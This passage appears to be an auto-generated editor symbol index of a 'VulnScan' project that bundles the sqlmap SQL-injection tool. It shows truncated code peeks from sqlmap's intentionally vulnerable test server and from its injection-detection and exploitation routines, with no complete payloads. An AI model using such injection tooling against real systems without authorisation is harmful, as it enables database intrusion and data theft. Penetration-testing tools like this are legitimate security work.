        "importPath": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "description": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "peekOfCode": "class ReqHandler(BaseHTTPRequestHandler):\n    def do_REQUEST(self):\n        path, query = self.path.split('?', 1) if '?' in self.path else (self.path, \"\")\n        params = {}\n        if query:\n            params.update(parse_qs(query))\n            if \"<script>\" in unquote_plus(query):\n                self.send_response(INTERNAL_SERVER_ERROR)\n                self.send_header(\"X-Powered-By\", \"Express\")\n                self.send_header(\"Connection\", \"close\")",
        "detail": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "documentation": {}
    },
    {
        "label": "init",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "description": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "peekOfCode": "def init(quiet=False):\n    global _conn\n    global _cursor\n    global _lock\n    _conn = sqlite3.connect(\":memory:\", isolation_level=None, check_same_thread=False)\n    _cursor = _conn.cursor()\n    _lock = threading.Lock()\n    _cursor.executescript(SCHEMA)\n    if quiet:\n        global print",
        "detail": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "documentation": {}
    },
    {
        "label": "run",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "description": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "peekOfCode": "def run(address=LISTEN_ADDRESS, port=LISTEN_PORT):\n    global _alive\n    global _server\n    try:\n        _alive = True\n        _server = ThreadingServer((address, port), ReqHandler)\n        print(\"[i] running HTTP server at 'http://%s:%d'\" % (address, port))\n        _server.serve_forever()\n    except KeyboardInterrupt:\n        _server.socket.close()",
        "detail": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "documentation": {}
    },
    {
        "label": "PY3",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "description": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "peekOfCode": "PY3 = sys.version_info >= (3, 0)\nUNICODE_ENCODING = \"utf-8\"\nDEBUG = False\nif PY3:\n    from http.client import INTERNAL_SERVER_ERROR\n    from http.client import NOT_FOUND\n    from http.client import OK\n    from http.server import BaseHTTPRequestHandler\n    from http.server import HTTPServer\n    from socketserver import ThreadingMixIn",
        "detail": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "documentation": {}
    },
    {
        "label": "UNICODE_ENCODING",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "description": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "peekOfCode": "UNICODE_ENCODING = \"utf-8\"\nDEBUG = False\nif PY3:\n    from http.client import INTERNAL_SERVER_ERROR\n    from http.client import NOT_FOUND\n    from http.client import OK\n    from http.server import BaseHTTPRequestHandler\n    from http.server import HTTPServer\n    from socketserver import ThreadingMixIn\n    from urllib.parse import parse_qs",
        "detail": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "documentation": {}
    },
    {
        "label": "DEBUG",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "description": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "peekOfCode": "DEBUG = False\nif PY3:\n    from http.client import INTERNAL_SERVER_ERROR\n    from http.client import NOT_FOUND\n    from http.client import OK\n    from http.server import BaseHTTPRequestHandler\n    from http.server import HTTPServer\n    from socketserver import ThreadingMixIn\n    from urllib.parse import parse_qs\n    from urllib.parse import unquote_plus",
        "detail": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "documentation": {}
    },
    {
        "label": "SCHEMA",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "description": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "peekOfCode": "SCHEMA = \"\"\"\n    CREATE TABLE users (\n        id INTEGER,\n        name TEXT,\n        surname TEXT,\n        PRIMARY KEY (id)\n    );\n    INSERT INTO users (id, name, surname) VALUES (1, 'luther', 'blisset');\n    INSERT INTO users (id, name, surname) VALUES (2, 'fluffy', 'bunny');\n    INSERT INTO users (id, name, surname) VALUES (3, 'wu', '179ad45c6ce2cb97cf1029e212046e81');",
        "detail": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "documentation": {}
    },
    {
        "label": "LISTEN_ADDRESS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "description": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "peekOfCode": "LISTEN_ADDRESS = \"localhost\"\nLISTEN_PORT = 8440\n_conn = None\n_cursor = None\n_lock = None\n_server = None\n_alive = False\ndef init(quiet=False):\n    global _conn\n    global _cursor",
        "detail": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "documentation": {}
    },
    {
        "label": "LISTEN_PORT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "description": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "peekOfCode": "LISTEN_PORT = 8440\n_conn = None\n_cursor = None\n_lock = None\n_server = None\n_alive = False\ndef init(quiet=False):\n    global _conn\n    global _cursor\n    global _lock",
        "detail": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "documentation": {}
    },
    {
        "label": "_conn",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "description": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "peekOfCode": "_conn = None\n_cursor = None\n_lock = None\n_server = None\n_alive = False\ndef init(quiet=False):\n    global _conn\n    global _cursor\n    global _lock\n    _conn = sqlite3.connect(\":memory:\", isolation_level=None, check_same_thread=False)",
        "detail": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "documentation": {}
    },
    {
        "label": "_cursor",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "description": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "peekOfCode": "_cursor = None\n_lock = None\n_server = None\n_alive = False\ndef init(quiet=False):\n    global _conn\n    global _cursor\n    global _lock\n    _conn = sqlite3.connect(\":memory:\", isolation_level=None, check_same_thread=False)\n    _cursor = _conn.cursor()",
        "detail": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "documentation": {}
    },
    {
        "label": "_lock",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "description": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "peekOfCode": "_lock = None\n_server = None\n_alive = False\ndef init(quiet=False):\n    global _conn\n    global _cursor\n    global _lock\n    _conn = sqlite3.connect(\":memory:\", isolation_level=None, check_same_thread=False)\n    _cursor = _conn.cursor()\n    _lock = threading.Lock()",
        "detail": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "documentation": {}
    },
    {
        "label": "_server",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "description": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "peekOfCode": "_server = None\n_alive = False\ndef init(quiet=False):\n    global _conn\n    global _cursor\n    global _lock\n    _conn = sqlite3.connect(\":memory:\", isolation_level=None, check_same_thread=False)\n    _cursor = _conn.cursor()\n    _lock = threading.Lock()\n    _cursor.executescript(SCHEMA)",
        "detail": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "documentation": {}
    },
    {
        "label": "_alive",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "description": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "peekOfCode": "_alive = False\ndef init(quiet=False):\n    global _conn\n    global _cursor\n    global _lock\n    _conn = sqlite3.connect(\":memory:\", isolation_level=None, check_same_thread=False)\n    _cursor = _conn.cursor()\n    _lock = threading.Lock()\n    _cursor.executescript(SCHEMA)\n    if quiet:",
        "detail": "VulnScan.modules.sqlmap.extra.vulnserver.vulnserver",
        "documentation": {}
    },
    {
        "label": "action",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.controller.action",
        "description": "VulnScan.modules.sqlmap.lib.controller.action",
        "peekOfCode": "def action():\n    \"\"\"\n    This function exploit the SQL injection on the affected\n    URL parameter and extract requested data from the\n    back-end database management system or operating system\n    if possible\n    \"\"\"\n    # First of all we have to identify the back-end database management\n    # system to be able to go ahead with the injection\n    setHandler()",
        "detail": "VulnScan.modules.sqlmap.lib.controller.action",
        "documentation": {}
    },
    {
        "label": "checkSqlInjection",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.controller.checks",
        "description": "VulnScan.modules.sqlmap.lib.controller.checks",
        "peekOfCode": "def checkSqlInjection(place, parameter, value):\n    # Store here the details about boundaries and payload used to\n    # successfully inject\n    injection = InjectionDict()\n    # Localized thread data needed for some methods\n    threadData = getCurrentThreadData()\n    # Favoring non-string specific boundaries in case of digit-like parameter values\n    if isDigit(value):\n        kb.cache.intBoundaries = kb.cache.intBoundaries or sorted(copy.deepcopy(conf.boundaries), key=lambda boundary: any(_ in (boundary.prefix or \"\") or _ in (boundary.suffix or \"\") for _ in ('\"', '\\'')))\n        boundaries = kb.cache.intBoundaries",
        "detail": "VulnScan.modules.sqlmap.lib.controller.checks",
        "documentation": {}
    },
    {
        "label": "heuristicCheckDbms",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.controller.checks",
        "description": "VulnScan.modules.sqlmap.lib.controller.checks",
        "peekOfCode": "def heuristicCheckDbms(injection):\n    \"\"\"\n    This functions is called when boolean-based blind is identified with a\n    generic payload and the DBMS has not yet been fingerprinted to attempt\n    to identify with a simple DBMS specific boolean-based test what the DBMS\n    may be\n    \"\"\"\n    retVal = False\n    if conf.skipHeuristics:\n        return retVal",
        "detail": "VulnScan.modules.sqlmap.lib.controller.checks",
        "documentation": {}
    },
    {
        "label": "checkFalsePositives",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.controller.checks",
        "description": "VulnScan.modules.sqlmap.lib.controller.checks",
        "peekOfCode": "def checkFalsePositives(injection):\n    \"\"\"\n    Checks for false positives (only in single special cases)\n    \"\"\"\n    retVal = True\n    if all(_ in (PAYLOAD.TECHNIQUE.BOOLEAN, PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED) for _ in injection.data) or (len(injection.data) == 1 and PAYLOAD.TECHNIQUE.UNION in injection.data and \"Generic\" in injection.data[PAYLOAD.TECHNIQUE.UNION].title):\n        pushValue(kb.injection)\n        infoMsg = \"checking if the injection point on %s \" % injection.place\n        infoMsg += \"parameter '%s' is a false positive\" % injection.parameter\n        logger.info(infoMsg)",
        "detail": "VulnScan.modules.sqlmap.lib.controller.checks",
        "documentation": {}
    },
    {
        "label": "checkSuhosinPatch",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.controller.checks",
        "description": "VulnScan.modules.sqlmap.lib.controller.checks",
        "peekOfCode": "def checkSuhosinPatch(injection):\n    \"\"\"\n    Checks for existence of Suhosin-patch (and alike) protection mechanism(s)\n    \"\"\"\n    if injection.place in (PLACE.GET, PLACE.URI):\n        debugMsg = \"checking for parameter length \"\n        debugMsg += \"constraining mechanisms\"\n        logger.debug(debugMsg)\n        pushValue(kb.injection)\n        kb.injection = injection",
        "detail": "VulnScan.modules.sqlmap.lib.controller.checks",
        "documentation": {}
    },
    {
        "label": "checkFilteredChars",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.controller.checks",
        "description": "VulnScan.modules.sqlmap.lib.controller.checks",
        "peekOfCode": "def checkFilteredChars(injection):\n    debugMsg = \"checking for filtered characters\"\n    logger.debug(debugMsg)\n    pushValue(kb.injection)\n    kb.injection = injection\n    randInt = randomInt()\n    # all other techniques are already using parentheses in tests\n    if len(injection.data) == 1 and PAYLOAD.TECHNIQUE.BOOLEAN in injection.data:\n        if not checkBooleanExpression(\"(%d)=%d\" % (randInt, randInt)):\n            warnMsg = \"it appears that some non-alphanumeric characters (i.e. ()) are \"",
        "detail": "VulnScan.modules.sqlmap.lib.controller.checks",
        "documentation": {}
    },
    {
        "label": "heuristicCheckSqlInjection",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.controller.checks",
        "description": "VulnScan.modules.sqlmap.lib.controller.checks",
        "peekOfCode": "def heuristicCheckSqlInjection(place, parameter):\n    if conf.skipHeuristics:\n        return None\n    origValue = conf.paramDict[place][parameter]\n    paramType = conf.method if conf.method not in (None, HTTPMETHOD.GET, HTTPMETHOD.POST) else place\n    prefix = \"\"\n    suffix = \"\"\n    randStr = \"\"\n    if conf.prefix or conf.suffix:\n        if conf.prefix:",
        "detail": "VulnScan.modules.sqlmap.lib.controller.checks",
        "documentation": {}
    },
    {
        "label": "checkDynParam",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.controller.checks",
        "description": "VulnScan.modules.sqlmap.lib.controller.checks",
        "peekOfCode": "def checkDynParam(place, parameter, value):\n    \"\"\"\n    This function checks if the URL parameter is dynamic. If it is\n    dynamic, the content of the page differs, otherwise the\n    dynamicity might depend on another parameter.\n    \"\"\"\n    if kb.choices.redirect:\n        return None\n    kb.matchRatio = None\n    dynResult = None",
        "detail": "VulnScan.modules.sqlmap.lib.controller.checks",
        "documentation": {}
    },
    {
        "label": "checkDynamicContent",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.controller.checks",
        "description": "VulnScan.modules.sqlmap.lib.controller.checks",
        "peekOfCode": "def checkDynamicContent(firstPage, secondPage):\n    \"\"\"\n    This function checks for the dynamic content in the provided pages\n    \"\"\"\n    if kb.nullConnection:\n        debugMsg = \"dynamic content checking skipped \"\n        debugMsg += \"because NULL connection used\"\n        logger.debug(debugMsg)\n        return\n    if any(page is None for page in (firstPage, secondPage)):",
        "detail": "VulnScan.modules.sqlmap.lib.controller.checks",
        "documentation": {}
    },
    {
        "label": "checkStability",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.controller.checks",
        "description": "VulnScan.modules.sqlmap.lib.controller.checks",
        "peekOfCode": "def checkStability():\n    \"\"\"\n    This function checks if the URL content is stable requesting the\n    same page two times with a small delay within each request to\n    assume that it is stable.\n    In case the content of the page differs when requesting\n    the same page, the dynamicity might depend on other parameters,\n    like for instance string matching (--string).\n    \"\"\"\n    infoMsg = \"testing if the target URL content is stable\"",
        "detail": "VulnScan.modules.sqlmap.lib.controller.checks",
        "documentation": {}
    },
    {
        "label": "checkWaf",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.controller.checks",
        "description": "VulnScan.modules.sqlmap.lib.controller.checks",
        "peekOfCode": "def checkWaf():\n    \"\"\"\n    Reference: http://seclists.org/nmap-dev/2011/q2/att-1005/http-waf-detect.nse\n    \"\"\"\n    if any((conf.string, conf.notString, conf.regexp, conf.dummy, conf.offline, conf.skipWaf)):\n        return None\n    if kb.originalCode == _http_client.NOT_FOUND:\n        return None\n    _ = hashDBRetrieve(HASHDB_KEYS.CHECK_WAF_RESULT, True)\n    if _ is not None:",
        "detail": "VulnScan.modules.sqlmap.lib.controller.checks",
        "documentation": {}
    },
    {
        "label": "checkNullConnection",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.controller.checks",
        "description": "VulnScan.modules.sqlmap.lib.controller.checks",
        "peekOfCode": "def checkNullConnection():\n    \"\"\"\n    Reference: http://www.wisec.it/sectou.php?id=472f952d79293\n    \"\"\"\n    if conf.data:\n        return False\n    _ = hashDBRetrieve(HASHDB_KEYS.CHECK_NULL_CONNECTION_RESULT, True)\n    if _ is not None:\n        kb.nullConnection = _\n        if _:",
        "detail": "VulnScan.modules.sqlmap.lib.controller.checks",
        "documentation": {}
    },
    {
        "label": "checkConnection",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.controller.checks",
        "description": "VulnScan.modules.sqlmap.lib.controller.checks",
        "peekOfCode": "def checkConnection(suppressOutput=False):\n    threadData = getCurrentThreadData()\n    if not re.search(r\"\\A\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\Z\", conf.hostname):\n        if not any((conf.proxy, conf.tor, conf.dummy, conf.offline)):\n            try:\n                debugMsg = \"resolving hostname '%s'\" % conf.hostname\n                logger.debug(debugMsg)\n                socket.getaddrinfo(conf.hostname, None)\n            except socket.gaierror:\n                errMsg = \"host '%s' does not exist\" % conf.hostname",
        "detail": "VulnScan.modules.sqlmap.lib.controller.checks",
        "documentation": {}
    },
    {
        "label": "checkInternet",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.controller.checks",
        "description": "VulnScan.modules.sqlmap.lib.controller.checks",
        "peekOfCode": "def checkInternet():\n    content = Request.getPage(url=CHECK_INTERNET_ADDRESS, checking=True)[0]\n    return CHECK_INTERNET_VALUE in (content or \"\")\ndef setVerbosity():  # Cross-referenced function\n    raise NotImplementedError",
        "detail": "VulnScan.modules.sqlmap.lib.controller.checks",
        "documentation": {}
    },
    {
        "label": "setVerbosity",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.controller.checks",
        "description": "VulnScan.modules.sqlmap.lib.controller.checks",
        "peekOfCode": "def setVerbosity():  # Cross-referenced function\n    raise NotImplementedError",
        "detail": "VulnScan.modules.sqlmap.lib.controller.checks",
        "documentation": {}
    },
    {
        "label": "start",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.controller.controller",
        "description": "VulnScan.modules.sqlmap.lib.controller.controller",
        "peekOfCode": "def start():\n    \"\"\"\n    This function calls a function that performs checks on both URL\n    stability and all GET, POST, Cookie and User-Agent parameters to\n    check if they are dynamic and SQL injection affected\n    \"\"\"\n    if conf.hashFile:\n        crackHashFile(conf.hashFile)\n    if conf.direct:\n        initTargetEnv()",
        "detail": "VulnScan.modules.sqlmap.lib.controller.controller",
        "documentation": {}
    },
    {
        "label": "setHandler",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.controller.handler",
        "description": "VulnScan.modules.sqlmap.lib.controller.handler",
        "peekOfCode": "def setHandler():\n    \"\"\"\n    Detect which is the target web application back-end database\n    management system.\n    \"\"\"\n    items = [\n        (DBMS.MYSQL, MYSQL_ALIASES, MySQLMap, MySQLConn),\n        (DBMS.ORACLE, ORACLE_ALIASES, OracleMap, OracleConn),\n        (DBMS.PGSQL, PGSQL_ALIASES, PostgreSQLMap, PostgreSQLConn),\n        (DBMS.MSSQL, MSSQL_ALIASES, MSSQLServerMap, MSSQLServerConn),",
        "detail": "VulnScan.modules.sqlmap.lib.controller.handler",
        "documentation": {}
    },
    {
        "label": "Agent",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.agent",
        "description": "VulnScan.modules.sqlmap.lib.core.agent",
        "peekOfCode": "class Agent(object):\n    \"\"\"\n    This class defines the SQL agent methods.\n    \"\"\"\n    def payloadDirect(self, query):\n        query = self.cleanupPayload(query)\n        if query.upper().startswith(\"AND \"):\n            query = re.sub(r\"(?i)AND \", \"SELECT \", query, 1)\n        elif query.upper().startswith(\" UNION ALL \"):\n            query = re.sub(r\"(?i) UNION ALL \", \"\", query, 1)",
        "detail": "VulnScan.modules.sqlmap.lib.core.agent",
        "documentation": {}
    },
    {
        "label": "agent",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.agent",
        "description": "VulnScan.modules.sqlmap.lib.core.agent",
        "peekOfCode": "agent = Agent()",
        "detail": "VulnScan.modules.sqlmap.lib.core.agent",
        "documentation": {}
    },
    {
        "label": "Cache",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.bigarray",
        "description": "VulnScan.modules.sqlmap.lib.core.bigarray",
        "peekOfCode": "class Cache(object):\n    \"\"\"\n    Auxiliary class used for storing cached chunks\n    \"\"\"\n    def __init__(self, index, data, dirty):\n        self.index = index\n        self.data = data\n        self.dirty = dirty\nclass BigArray(list):\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.bigarray",
        "documentation": {}
    },
    {
        "label": "BigArray",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.bigarray",
        "description": "VulnScan.modules.sqlmap.lib.core.bigarray",
        "peekOfCode": "class BigArray(list):\n    \"\"\"\n    List-like class used for storing large amounts of data (disk cached)\n    >>> _ = BigArray(xrange(100000))\n    >>> _[20] = 0\n    >>> _[99999]\n    99999\n    >>> _ += [0]\n    >>> _[100000]\n    0",
        "detail": "VulnScan.modules.sqlmap.lib.core.bigarray",
        "documentation": {}
    },
    {
        "label": "UnicodeRawConfigParser",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "class UnicodeRawConfigParser(_configparser.RawConfigParser):\n    \"\"\"\n    RawConfigParser with unicode writing support\n    \"\"\"\n    def write(self, fp):\n        \"\"\"\n        Write an .ini-format representation of the configuration state.\n        \"\"\"\n        if self._defaults:\n            fp.write(\"[%s]\\n\" % _configparser.DEFAULTSECT)",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "Format",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "class Format(object):\n    @staticmethod\n    def humanize(values, chain=\" or \"):\n        return chain.join(values)\n    # Get methods\n    @staticmethod\n    def getDbms(versions=None):\n        \"\"\"\n        Format the back-end DBMS fingerprint value and return its\n        values formatted as a human readable string.",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "class Backend(object):\n    @staticmethod\n    def setDbms(dbms):\n        dbms = aliasToDbmsEnum(dbms)\n        if dbms is None:\n            return None\n        # Little precaution, in theory this condition should always be false\n        elif kb.dbms is not None and kb.dbms != dbms:\n            warnMsg = \"there appears to be a high probability that \"\n            warnMsg += \"this could be a false positive case\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "paramToDict",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def paramToDict(place, parameters=None):\n    \"\"\"\n    Split the parameters into names and values, check if these parameters\n    are within the testable parameters and return in a dictionary.\n    \"\"\"\n    testableParameters = OrderedDict()\n    if place in conf.parameters and not parameters:\n        parameters = conf.parameters[place]\n    parameters = re.sub(r\"&(\\w{1,4});\", r\"%s\\g<1>%s\" % (PARAMETER_AMP_MARKER, PARAMETER_SEMICOLON_MARKER), parameters)\n    if place == PLACE.COOKIE:",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "getManualDirectories",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def getManualDirectories():\n    directories = None\n    defaultDocRoot = DEFAULT_DOC_ROOTS.get(Backend.getOs(), DEFAULT_DOC_ROOTS[OS.LINUX])\n    if kb.absFilePaths:\n        for absFilePath in kb.absFilePaths:\n            if directories:\n                break\n            if directoryPath(absFilePath) == '/':\n                continue\n            absFilePath = normalizePath(absFilePath)",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "getAutoDirectories",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def getAutoDirectories():\n    \"\"\"\n    >>> pushValue(kb.absFilePaths)\n    >>> kb.absFilePaths = [\"C:\\\\inetpub\\\\wwwroot\\\\index.asp\", \"/var/www/html\"]\n    >>> getAutoDirectories()\n    ['C:/inetpub/wwwroot', '/var/www/html']\n    >>> kb.absFilePaths = popValue()\n    \"\"\"\n    retVal = OrderedSet()\n    if kb.absFilePaths:",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "filePathToSafeString",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def filePathToSafeString(filePath):\n    \"\"\"\n    Returns string representation of a given filepath safe for a single filename usage\n    >>> filePathToSafeString('C:/Windows/system32')\n    'C__Windows_system32'\n    \"\"\"\n    retVal = filePath.replace(\"/\", \"_\").replace(\"\\\\\", \"_\")\n    retVal = retVal.replace(\" \", \"_\").replace(\":\", \"_\")\n    return retVal\ndef singleTimeDebugMessage(message):",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeDebugMessage",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def singleTimeDebugMessage(message):\n    singleTimeLogMessage(message, logging.DEBUG)\ndef singleTimeWarnMessage(message):\n    singleTimeLogMessage(message, logging.WARN)\ndef singleTimeLogMessage(message, level=logging.INFO, flag=None):\n    if flag is None:\n        flag = hash(message)\n    if not conf.smokeTest and flag not in kb.singleLogFlags:\n        kb.singleLogFlags.add(flag)\n        logger.log(level, message)",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def singleTimeWarnMessage(message):\n    singleTimeLogMessage(message, logging.WARN)\ndef singleTimeLogMessage(message, level=logging.INFO, flag=None):\n    if flag is None:\n        flag = hash(message)\n    if not conf.smokeTest and flag not in kb.singleLogFlags:\n        kb.singleLogFlags.add(flag)\n        logger.log(level, message)\ndef boldifyMessage(message, istty=None):\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeLogMessage",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def singleTimeLogMessage(message, level=logging.INFO, flag=None):\n    if flag is None:\n        flag = hash(message)\n    if not conf.smokeTest and flag not in kb.singleLogFlags:\n        kb.singleLogFlags.add(flag)\n        logger.log(level, message)\ndef boldifyMessage(message, istty=None):\n    \"\"\"\n    Sets ANSI bold marking on entire message if parts found in predefined BOLD_PATTERNS\n    >>> boldifyMessage(\"Hello World\", istty=True)",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "boldifyMessage",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def boldifyMessage(message, istty=None):\n    \"\"\"\n    Sets ANSI bold marking on entire message if parts found in predefined BOLD_PATTERNS\n    >>> boldifyMessage(\"Hello World\", istty=True)\n    'Hello World'\n    >>> boldifyMessage(\"GET parameter id is not injectable\", istty=True)\n    '\\\\x1b[1mGET parameter id is not injectable\\\\x1b[0m'\n    \"\"\"\n    retVal = message\n    if any(_ in message for _ in BOLD_PATTERNS):",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "setColor",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def setColor(message, color=None, bold=False, level=None, istty=None):\n    \"\"\"\n    Sets ANSI color codes\n    >>> setColor(\"Hello World\", color=\"red\", istty=True)\n    '\\\\x1b[31mHello World\\\\x1b[0m'\n    >>> setColor(\"[INFO] Hello World\", istty=True)\n    '[\\\\x1b[32mINFO\\\\x1b[0m] Hello World'\n    >>> setColor(\"[INFO] Hello [CRITICAL] World\", istty=True)\n    '[INFO] Hello [CRITICAL] World'\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "clearColors",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def clearColors(message):\n    \"\"\"\n    Clears ANSI color codes\n    >>> clearColors(\"\\x1b[38;5;82mHello \\x1b[38;5;198mWorld\")\n    'Hello World'\n    \"\"\"\n    retVal = message\n    if isinstance(message, str):\n        retVal = re.sub(r\"\\x1b\\[[\\d;]+m\", \"\", message)\n    return retVal",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "dataToStdout",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def dataToStdout(data, forceOutput=False, bold=False, contentType=None, status=CONTENT_STATUS.IN_PROGRESS, coloring=True):\n    \"\"\"\n    Writes text to the stdout (console) stream\n    \"\"\"\n    if not IS_TTY and isinstance(data, six.string_types) and data.startswith(\"\\r\"):\n        if re.search(r\"\\(\\d+%\\)\", data):\n            data = \"\"\n        else:\n            data = \"\\n%s\" % data.strip(\"\\r\")\n    if not kb.get(\"threadException\"):",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
